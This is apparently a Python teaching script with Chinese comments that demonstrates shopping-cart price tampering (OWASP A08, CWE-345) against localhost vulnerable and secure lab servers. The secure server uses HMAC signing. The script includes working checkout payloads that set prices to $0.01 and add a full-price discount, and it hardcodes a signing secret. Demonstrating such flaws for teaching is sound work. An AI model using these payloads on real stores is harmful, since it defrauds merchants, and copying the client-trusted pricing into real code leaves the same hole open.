#!/usr/bin/env python3
"""
A08:2021 - Cart Data Tampering
CWE-345: Insufficient Verification of Data Authenticity
CWE-353: Missing Support for Integrity Check

攻擊原理：
1. 漏洞版本直接信任客戶端傳來的購物車資料，包括價格
2. 攻擊者可以修改商品價格，以極低價格購買商品
3. 安全版本使用 HMAC-SHA256 簽名，確保資料未被竄改
"""

import requests
import json
import sys
import hmac
import hashlib

# 目標 URL
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# HMAC 金鑰（與 internal API 的 jwt_secret 相同）
HMAC_SECRET = "your-super-secret-jwt-key-that-should-never-be-exposed"


def print_response(response):
    """格式化輸出回應"""
    print(f"Status: {response.status_code}")
    try:
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
    except:
        print(response.text[:500])


def calculate_hmac(data: dict) -> str:
    """計算 HMAC-SHA256 簽名"""
    message = json.dumps(data, separators=(',', ':'), sort_keys=True)
    signature = hmac.new(
        HMAC_SECRET.encode('utf-8'),
        message.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    return signature


def demo_price_manipulation_vulnerable():
    """
    對漏洞版本進行價格操控攻擊
    """
    print("\n" + "="*60)
    print("漏洞版本 - 價格操控攻擊 (CWE-345)")
    print("="*60)
    
    # 正常購物車（商品原價 $999.99）
    normal_cart = {
        "items": [
            {"name": "iPhone 15 Pro", "productId": 1, "quantity": 1, "price": 999.99},
            {"name": "AirPods Pro", "productId": 2, "quantity": 2, "price": 249.99}
        ]
    }
    
    print("\n[1] 正常購物車:")
    print(json.dumps(normal_cart, indent=2))
    print(f"    正常總價: ${999.99 + 249.99 * 2:.2f}")
    
    # 竄改價格的購物車
    tampered_cart = {
        "items": [
            {"name": "iPhone 15 Pro", "productId": 1, "quantity": 1, "price": 0.01},  # $999.99 -> $0.01
            {"name": "AirPods Pro", "productId": 2, "quantity": 2, "price": 0.01}     # $249.99 -> $0.01
        ]
    }
    
    print("\n[2] 竄改後的購物車:")
    print(json.dumps(tampered_cart, indent=2))
    print(f"    竄改後總價: ${0.01 + 0.01 * 2:.2f}")
    
    print("\n[3] 發送竄改的購物車進行結帳...")
    response = requests.post(
        f"{VULNERABLE_URL}/api/integrity/cart/checkout",
        json=tampered_cart,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        data = response.json()
        total = float(data.get("total", 0))
        print(f"\n[+] ✓ 攻擊成功！")
        print(f"    原價: $1499.97")
        print(f"    付款: ${total:.2f}")
        print(f"    省下: ${1499.97 - total:.2f}")
    
    # 新增惡意折扣
    print("\n[4] 嘗試加入惡意折扣...")
    cart_with_discount = {
        "items": [
            {"name": "MacBook Pro", "productId": 3, "quantity": 1, "price": 2499.99}
        ],
        "discount": 2499.99  # 100% 折扣
    }
    
    response = requests.post(
        f"{VULNERABLE_URL}/api/integrity/cart/checkout",
        json=cart_with_discount,
        timeout=10
    )
    print_response(response)


def demo_price_manipulation_secure():
    """
    對安全版本進行價格操控攻擊（應該失敗）
    """
    print("\n" + "="*60)
    print("安全版本 - HMAC 簽名驗證")
    print("="*60)
    
    # 嘗試不帶簽名的購物車
    print("\n[1] 嘗試不帶簽名的購物車...")
    tampered_cart = {
        "items": [
            {"name": "iPhone 15 Pro", "productId": 1, "quantity": 1, "price": 0.01}
        ]
    }
    
    response = requests.post(
        f"{SECURE_URL}/api/integrity/cart/checkout",
        json=tampered_cart,
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 400:
        print("\n[+] ✓ 沒有簽名的購物車被拒絕！")
    
    # 正確流程：先儲存購物車取得簽名
    print("\n[2] 正確流程：儲存購物車取得 HMAC 簽名...")
    normal_cart = {
        "items": [
            {"name": "iPhone 15 Pro", "productId": 1, "quantity": 1, "price": 999.99}
        ]
    }
    
    response = requests.post(
        f"{SECURE_URL}/api/integrity/cart/save",
        json=normal_cart,
        headers={"X-User-Id": "1"},
        timeout=10
    )
    print_response(response)
    
    if response.status_code == 200:
        signature = response.json().get("signature")
        print(f"\n[*] 取得簽名: {signature}")
        
        # 嘗試竄改並使用原簽名
        print("\n[3] 嘗試竄改價格但使用原簽名...")
        tampered_cart = {
            "items": [
                {"name": "iPhone 15 Pro", "productId": 1, "quantity": 1, "price": 0.01}
            ],
            "signature": signature  # 原簽名
        }
        
        response = requests.post(
            f"{SECURE_URL}/api/integrity/cart/checkout",
            json=tampered_cart,
            timeout=10
        )
        print_response(response)
        
        if response.status_code == 400:
            print("\n[+] ✓ 竄改的購物車被 HMAC 驗證拒絕！")
            print("[*] 簽名不匹配，資料完整性驗證成功")
    
    # 使用正確簽名結帳
    print("\n[4] 使用正確簽名結帳...")
    normal_cart["signature"] = calculate_hmac(normal_cart)
    
    response = requests.post(
        f"{SECURE_URL}/api/integrity/cart/checkout",
        json={**normal_cart, "signature": calculate_hmac({"items": normal_cart["items"]})},
        timeout=10
    )
    print_response(response)


def main():
    """主函數"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  A08:2021 - Cart Data Tampering                              ║
║  CWE-345: Insufficient Verification of Data Authenticity     ║
╠═══════════════════════════════════════════════════════════════╣
║  攻擊方式：修改客戶端購物車中的商品價格                      ║
║  防禦方式：HMAC-SHA256 簽名驗證資料完整性                    ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        if target == "vulnerable":
            demo_price_manipulation_vulnerable()
        elif target == "secure":
            demo_price_manipulation_secure()
        elif target == "both":
            demo_price_manipulation_vulnerable()
            demo_price_manipulation_secure()
        else:
            print(f"用法: {sys.argv[0]} [vulnerable|secure|both]")
    else:
        demo_price_manipulation_vulnerable()
        print("\n" + "-"*60 + "\n")
        demo_price_manipulation_secure()
    
    print("\n[*] 演示完成")


if __name__ == "__main__":
    main()
